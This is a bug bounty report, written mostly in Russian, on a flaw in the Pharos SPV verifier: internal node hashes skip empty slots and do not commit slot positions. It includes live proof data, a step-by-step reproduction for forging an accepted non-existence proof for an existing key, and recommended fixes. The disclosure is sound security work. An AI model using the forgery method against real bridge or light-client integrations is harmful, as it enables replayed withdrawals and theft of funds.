# Bug Bounty Report: Pharos SPV — неоднозначность позиции Internal node

**Дата:** 2026-04-29  
**Цель:** Pharos Network SPV / верификация `eth_getProof`  
**Затронутый компонент:** хеширование Internal node и проверка non-existence proof  
**Severity:** Critical для любого bridge/light-client интегратора, который использует официальный verifier или эквивалентную логику. Текущий live bridge TVL impact по публичным источникам не доказан.  
**Статус:** воспроизведено на live Pharos RPC (`https://rpc.pharos.xyz`)  

---

## Executive Summary

Хеш Internal node в Pharos SPV не коммитит индексы child slot.

Фактическая формула хеша Internal node, используемая официальным verifier и подтверждённая на live RPC данных:

```text
H_internal = SHA256(header_3_bytes || concat(non_empty_child_hashes_in_slot_order))
```

В hash input **не входят**:

```text
slot index i
empty slots
RLP / SSZ / self-describing encoding
полный 515-byte raw internal node
```

Это позволяет переместить непустой child hash в другой пустой slot и сохранить тот же Internal node hash, если относительный порядок непустых хешей не меняется.

Проблема эксплуатируется против семантики официального reference verifier. Live proof для существующего account был изменён так, что path slot стал пустым. Изменённый proof всё равно восстанавливал тот же block `stateRoot` и принимался top-level verifier как non-existence proof, если `siblingLeftmostLeafProofs` был опущен.

Наблюдаемый результат:

```text
verify_spv(original existence proof, key)          = True
existence(original)                               = True

verify_spv(forged truncated non-existence proof)  = True
existence(forged proof)                           = False
```

Это означает, что официальный reference verifier принимает proof, утверждающий, что существующий key отсутствует.

---

## Impact

Если bridge, light client или cross-chain приложение использует официальный Pharos SPV verifier или эквивалентную логику и принимает отсутствующий/пустой `siblingLeftmostLeafProofs`, атакующий может создать валидный non-existence proof для существующего key.

Для bridge-приложений это может сломать replay/withdrawal-record checks. Например, если bridge хранит withdrawal/nullifier record, а затем принимает Pharos SPV proof, что такой record не существует, один и тот же withdrawal может быть принят повторно.

Я **не нашёл** публичный currently deployed mainnet bridge contract, который использует этот verifier. Публичная информация указывает, что canonical cross-chain infrastructure Pharos использует Chainlink CCIP, а архитектура Fiamma bridge основана на BitVM/ZK. Поэтому текущий live TVL impact по публичным источникам не доказан.

Рекомендуемая формулировка severity:

```text
Critical: для любой интеграции, использующей официальный verifier или эквивалентную логику.
Protocol/reference implementation bug: подтверждено.
Live deployed bridge drain: не доказан по публичным источникам.
```

---

## Проверенные источники

Официальная Pharos SPV документация:

```text
https://docs.pharosnetwork.xyz/api-and-sdk/eth-getproof-storage-state-verification
```

Официальный Pharos examples repository:

```text
https://github.com/PharosNetwork/examples/blob/main/spv-verification/spv_verify.py
```

Анонс canonical cross-chain infrastructure:

```text
https://www.pharos.xyz/blog/pharos-adopts-chainlink-ccip-as-its-canonical-cross-chain-infrastructure-and-chainlink-data-streams-to-power-tokenized-rwa-markets
```

Документация Fiamma bridge с Pharos testnet address:

```text
https://docs.fiammalabs.io/our-product-suite/pragmatically-trustless-bitvm-bitcoin-bridge/user-guides/testnet-beta/copy-of-how-to-deposit-and-withdraw-on-fiamma-bridge
```

---

## Логика официального verifier

Официальный `spv_verify.py` содержит:

```python
def hash_internal_node_skip_empty(proof_str: bytes) -> Optional[bytes]:
    """Hash internal node: header + non-zero slots in order."""
    if len(proof_str) != INTERNAL_NODE_BODY_LEN:
        return None
    h = hashlib.sha256()
    h.update(proof_str[:INTERNAL_NODE_HEADER])
    for i in range(INTERNAL_NODE_SLOTS):
        start = INTERNAL_NODE_HEADER + i * INTERNAL_NODE_SLOT_SIZE
        slot = proof_str[start : start + INTERNAL_NODE_SLOT_SIZE]
        if not is_all_zero(slot):
            h.update(slot)
    return h.digest()
```

Следовательно:

```text
H = SHA256(header || non_empty_slot_values)
```

Важно:

```text
index i используется только для вычисления offset слота
index i не хешируется
empty slots пропускаются
```

Top-level verifier содержит:

```python
exist = is_existence_proof(proof_nodes, key)
if not exist and sibling_list:
    ok, err = verify_sibling_proofs(proof_nodes, sibling_list, root_hash)
    if not ok:
        return False, f"{label}: {err}"
return True, None
```

Поэтому если `exist == False` и `sibling_list == []`, sibling verification пропускается, и proof принимается, если main chain валидна.

---

## Live Proof 1: Internal hash formula совпадает с chain commitments

Live RPC:

```text
https://rpc.pharos.xyz
```

Request:

```text
eth_getProof(
  "0x4100000000000000000000000000000000000000",
  [],
  "latest"
)
```

Наблюдаемая форма proof:

```text
proof nodes: 6
sizes: 8192, 515, 515, 515, 515, 65
```

Для каждого internal child я сравнил hash, лежащий в parent slot, с тремя кандидатными моделями:

```text
SHA256(non_empty_children_only)
SHA256(header_3_bytes || non_empty_children)
SHA256(full_515_raw_node)
```

Результаты:

```text
Internal child node #1 committed by parent #0
non-empty slots: 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
hash_from_chain:      0x5276db16f6f4154a7f9530c3a589393318408160dc82aee1d3698058362b091b
skip_no_header:       0x2d65c6bfc4fee24e99a7505e2cc8a72f15d9ed3704244e726d2ae91207c246cf no
skip_with_header:     0x5276db16f6f4154a7f9530c3a589393318408160dc82aee1d3698058362b091b MATCH
sha256(full_515_raw): 0x5276db16f6f4154a7f9530c3a589393318408160dc82aee1d3698058362b091b MATCH

Internal child node #3 committed by parent #2
non-empty slots: 0,2,3,5,6,8,10,11,14,15
hash_from_chain:      0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5
skip_no_header:       0x79d7fc2c8357f1652c1f43f7ddd1d5d6fa3c3b14bb4c57996831a2b4e9bf6da1 no
skip_with_header:     0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5 MATCH
sha256(full_515_raw): 0x46bb9c9c2764ea468b251f95baef31dbd1703be60c947173819438bfe2ab7198 no

Internal child node #4 committed by parent #3
non-empty slots: 1,4
hash_from_chain:      0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd
skip_no_header:       0x1390ae0cbe92ba2cbee297aff0b3e37cbfb9e93d921509fbda5543cdbde76a4e no
skip_with_header:     0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd MATCH
sha256(full_515_raw): 0x6829694a9c2d4cc2ccdd9ef13f2a9836fd1f83b8b38429725b41b1f59dd21f5d no
```

Вывод:

```text
H_internal = SHA256(header_3_bytes || non_empty_child_hashes)
```

---

## Live Proof 2: вся proof chain восстанавливает `stateRoot`

Block:

```text
0x59b9ee
```

Block `stateRoot`:

```text
0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
```

Форма proof:

```text
proof node count: 6
proof sizes: 8192, 515, 515, 515, 515, 65
```

Каждая parent-to-child связь совпала:

```text
node[0] MSU Root -> node[1] Internal: MATCH
node[1] Internal -> node[2] Internal: MATCH
node[2] Internal -> node[3] Internal: MATCH
node[3] Internal -> node[4] Internal: MATCH
node[4] Internal -> node[5] Leaf: MATCH
```

Восстановление снизу вверх:

```text
start from leaf hash:
0x17b9a017bc4a319a1adbc93e11238cf9dcc7f6f25b2435f29617875c66da3b12

after hashing node[4] Internal:
0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd

after hashing node[3] Internal:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

after hashing node[2] Internal:
0xba02bc126f1a2e28af292645b00ad09a43ee8e72f3e4b06d73690ea36c3953b1

after hashing node[1] Internal:
0xaa050297f7f6157b0867145cea890352ebc3462eee40d940b110cb7fb73f9a2b

after hashing node[0] MSU Root:
0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
```

Финальная проверка:

```text
computed root:   0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
expected root:   0x9312278037625d87c542612563a2f43ecb06fb36c0411bf2e4054dc88d1bd0ca
root check:      MATCH
```

---

## Live Proof 3: перемещение slot сохраняет Internal hash и root

Block:

```text
0x59bd30
```

Выбранная internal node:

```text
node_index = 3
size = 515 bytes
```

Raw node hex:

```text
0x00000030c7381e25498f0631b1303746bb0dade695ec2e9d175a52eab8e261fc7db8040000000000000000000000000000000000000000000000000000000000000000c7cda1d3c3ae123085af48b46d85695ba2d8a3671c336cd7d4a4397e936807fab08cc99f467e1dd05b769d645d930e88362d7ec87b4963a7de83242bda7c68ce000000000000000000000000000000000000000000000000000000000000000013de40ba36aec809ff9ca1ddb8c88dce68a137627241cfe065f0c62a46c9d6680cdd9517d31bf10ae2a1d76b146d7c8eaa2fb1ab202a426b7fcf97f4765e9c2b00000000000000000000000000000000000000000000000000000000000000009d5d2d7bd70422271e3c63b24eac46354dab91aae648d5987da61cdf64d862b100000000000000000000000000000000000000000000000000000000000000006a7a2b8ee168d3455f92c819562b489786665111ec6a990b60271e7a01fc175f4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000269b11296cc3306e1c734ad7e64f5a115532699fe542924dfbc17a442ea876ae837d580f837dfa3bd48a95753c811b52ef268c822309a04ae2717274d6c1ba27
```

Slots:

```text
non_empty_slots = [0, 2, 3, 5, 6, 8, 10, 11, 14, 15]
empty_slots     = [1, 4, 7, 9, 12, 13]
```

Выбранное перемещение:

```text
prev = 0
src  = 2
dst  = 1
next = 3

Condition:
prev_nonempty < dst < next_nonempty
0 < 1 < 3
```

Операция:

```text
move slot[2] -> slot[1]
```

Результат hash:

```text
hash_original:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_fake:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_fake == hash_original: True
```

Результат root:

```text
root_original:
0xb1d3fb72148893df861e51a8c43d8d91f225d43d008f7841a6ad3fd3ec788ae0

root_fake:
0xb1d3fb72148893df861e51a8c43d8d91f225d43d008f7841a6ad3fd3ec788ae0

block_root:
0xb1d3fb72148893df861e51a8c43d8d91f225d43d008f7841a6ad3fd3ec788ae0

root_fake_eq_original: True
root_original_eq_block: True
```

Это доказывает, что изменение позиции slot может сохранять root commitment.

---

## Live Proof 4: harmless aliasing case

Для key:

```text
0x4100000000000000000000000000000000000000
```

Key hash:

```text
0xfc4b5e1bafc2111cad22acda289e82749ab2a8c5f0069695fe052672875f1b41
```

Slots пути, которые использует verifier:

```text
node[0] -> node[1]: slot=0
node[1] -> node[2]: slot=12
node[2] -> node[3]: slot=15
node[3] -> node[4]: slot=11
node[4] -> node[5]: slot=4
```

Мутация:

```text
node[3]: move slot[2] -> slot[1]
```

Эта мутация не затрагивает path slot (`slot[11]`) для целевого key.

Результат verifier:

```text
hash_equal: True

verify(original, key):   True
verify(fake_proof, key): True
existence(original):     True
existence(fake):         True
leaf_same:               True
```

Классификация:

```text
TRUE, но значение/leaf те же.
Это structural aliasing, ещё не exploit.
```

---

## Live Proof 5: targeted path-slot move создаёт accepted non-existence proof

Для того же key:

```text
0x4100000000000000000000000000000000000000
```

Path slot в `node[3]`:

```text
node_index = 3
path_depth = 2
path_slot/src = 11
dst = 12
```

До мутации:

```text
non_empty_before = [0,2,3,5,6,8,10,11,14,15]
empty_before     = [1,4,7,9,12,13]

slot[11] = 0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd
slot[12] = 0x0000000000000000000000000000000000000000000000000000000000000000
```

Операция:

```text
move slot[11] -> slot[12]
```

После мутации:

```text
slot[11] = 0x0000000000000000000000000000000000000000000000000000000000000000
slot[12] = 0x4cb8be5f2c73b4ae73ca252cd0ddde27d95416d77c4eb6f694c6b2082bbfafcd

non_empty_after = [0,2,3,5,6,8,10,12,14,15]
```

Hash всё ещё совпадает:

```text
hash_original:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_fake:
0xe4ed2d15acc04c0838979fae504b2e8da2900cf50f17d89a402eb6e8a07153a5

hash_equal: True
```

Результаты verifier:

```text
verify(original full existence, key): True
existence(original): True

verify(fake full proof, key): False
existence(fake full): True

verify(fake truncated non-existence, key): True
existence(fake truncated): False
```

Классификация:

```text
original: key exists
fake truncated proof: key does not exist
verifier accepts fake truncated proof
```

Это exploit condition.

---

## Live Proof 6: top-level `verify_spv` и поведение sibling proof

Официальная документация говорит, что non-existence proofs включают `siblingLeftmostLeafProofs`, а sibling verification предназначена для защиты non-existence proofs.

Однако официальный reference verifier проверяет siblings только если список truthy:

```python
if not exist and sibling_list:
    verify_sibling_proofs(...)
```

Наблюдаемый live test:

```text
block: 0x59bff1
siblingLeftmostLeafProofs_count: 1

mutation:
node[3] path slot[11] -> empty slot[12]

hash_equal: True
```

Результат top-level verifier:

```text
verify_spv(original, original_siblings): True
existence(original): True

verify_spv(fake_truncated, empty_siblings): True
existence(fake_truncated): False

verify_spv(fake_truncated, original_siblings):
False: sibling[0] proof chain verification failed
```

Интерпретация:

```text
Оригинальные sibling proofs не валидируют forged proof.
Но если siblingLeftmostLeafProofs опущен или пуст, официальный verifier принимает forged non-existence proof.
```

Следовательно, reference verifier на практике считает sibling proofs опциональными, хотя документация описывает их как часть non-existence verification.

---

## Почему это работает

Рассмотрим Internal node с непустыми slots:

```text
[0, 2, 3, 5, 6, 8, 10, 11, 14, 15]
```

Hash input:

```text
header || H0 || H2 || H3 || H5 || H6 || H8 || H10 || H11 || H14 || H15
```

Если `H11` переместить в пустой slot между соседями, например `slot[12]`, порядок непустых элементов остаётся:

```text
[0, 2, 3, 5, 6, 8, 10, 12, 14, 15]
```

Hash input всё ещё:

```text
header || H0 || H2 || H3 || H5 || H6 || H8 || H10 || H11 || H14 || H15
```

Значит:

```text
hash(original_node) == hash(mutated_node)
```

Но verifier для key, чей path slot равен `11`, видит:

```text
original slot[11] = H11       => key path continues / existence proof
mutated  slot[11] = zero      => proof terminates as non-existence
```

Так как parent commitment не изменился, mutated node всё ещё хешируется до того же trusted `stateRoot`.

---

## Нарушенная security assumption

Нарушенное предположение: Internal node hash коммитит полный slot layout.

Это не так.

Текущий commitment связывает только:

```text
header
ordered sequence of non-empty child hashes
```

Он не связывает:

```text
какой child hash в каком slot находится
какие slots пустые
```

Поэтому non-existence proofs, основанные на empty slot, не sound, если нет дополнительного обязательного механизма, который связывает полный child layout.

---

## Recommended Fixes

### Preferred Fix

Хешировать полный fixed-size internal node:

```text
H_internal = SHA256(full_515_byte_internal_node)
```

Это коммитит:

```text
3-byte header
all 16 child slots
empty slots
slot positions
```

### Alternative Fix

Кодировать index каждого non-empty slot в hash input:

```text
H_internal = SHA256(
  header ||
  index_0 || child_hash_0 ||
  index_1 || child_hash_1 ||
  ...
)
```

Пример:

```python
h.update(proof_str[:3])
for i in range(16):
    slot = proof_str[3+i*32 : 3+(i+1)*32]
    if slot != b"\x00" * 32:
        h.update(bytes([i]))
        h.update(slot)
```

### Mandatory Verifier Hardening

Для non-existence proofs:

```text
reject if siblingLeftmostLeafProofs is absent
reject if siblingLeftmostLeafProofs is empty
reject sibling entries with empty proofPath
verify all non-empty sibling slots, or otherwise enforce a layout commitment that makes siblings unnecessary
```

Текущий reference verifier не должен использовать:

```python
if not exist and sibling_list:
```

Он должен требовать sibling proofs для non-existence:

```python
if not exist:
    if not sibling_list:
        return False, "non-existence proof requires siblingLeftmostLeafProofs"
    ok, err = verify_sibling_proofs(...)
```

Однако обязательные siblings сами по себе не полностью исправляют underlying hash ambiguity, если sibling verification не доказывает полный slot layout или internal hash не изменён так, чтобы коммитить позиции.

---

## Reproduction Outline

1. Получить live proof:

```text
eth_getProof(
  "0x4100000000000000000000000000000000000000",
  [],
  block_number
)
```

2. Распарсить `accountProof`.

3. Хешировать каждую node снизу вверх:

```text
Leaf:     SHA256(65-byte leaf)
Internal: SHA256(header_3_bytes || non_empty_child_hashes_in_slot_order)
MSU Root: SHA256(8192-byte root node)
```

4. Подтвердить, что reconstructed root равен `eth_getBlockByNumber(block).stateRoot`.

5. Выбрать internal node на proof path с условиями:

```text
path slot = non-empty
nearby empty slot exists between adjacent non-empty slots
```

6. Переместить path child hash в этот empty slot, сохранив non-empty order.

7. Подтвердить:

```text
hash(mutated_internal) == hash(original_internal)
root(mutated_proof) == root(original_proof)
```

8. Обрезать proof на mutated internal node. Path slot теперь zero, поэтому verifier интерпретирует proof как non-existence.

9. Вызвать top-level verification с пустым `siblingLeftmostLeafProofs`.

Наблюдалось:

```text
verify_spv(fake_truncated, key, root, []) == True
is_existence_proof(fake_truncated, key) == False
```

---

## Public Consumer Review

Я искал публично доступные deployed или open-source consumers этого verifier:

```text
siblingLeftmostLeafProofs
leftmostLeafKey
nextBeginOffset
proofNode
hash_internal_node_skip_empty
Pharos SPV verifier
Pharos bridge SPV
```

Findings:

```text
Official reference verifier: vulnerable behavior confirmed.
Official docs: SPV documented for light clients and cross-chain verification.
Canonical Pharos bridge: public announcement says Chainlink CCIP.
Fiamma bridge: public docs describe BitVM/ZK architecture; no Pharos SPV verifier usage found.
Fiamma Pharos testnet address 0x40e75eF8Ea38A1e1362edD88234D327e14533992:
  - eth_getCode on Pharos mainnet RPC returned 0x
  - eth_getCode on Atlantic RPC returned 0x
```

Вывод:

```text
No public live contract/bridge using this verifier was identified.
The vulnerability is confirmed in the official reference verifier and protocol proof model.
```

---

## Final Classification

Если любая production bridge/light-client integration использует официальный verifier или эквивалентную логику:

```text
Critical
```

Потому что:

```text
existing key can be proven absent
root commitment remains valid
official top-level verifier accepts the forged non-existence proof when siblings are omitted
```

Если deployed integration пока нет:

```text
High / Critical protocol-reference bug
```

Потому что:

```text
official documentation positions SPV for cross-chain verification
official reference verifier accepts forged non-existence proofs
future integrations following the example are vulnerable by default
```

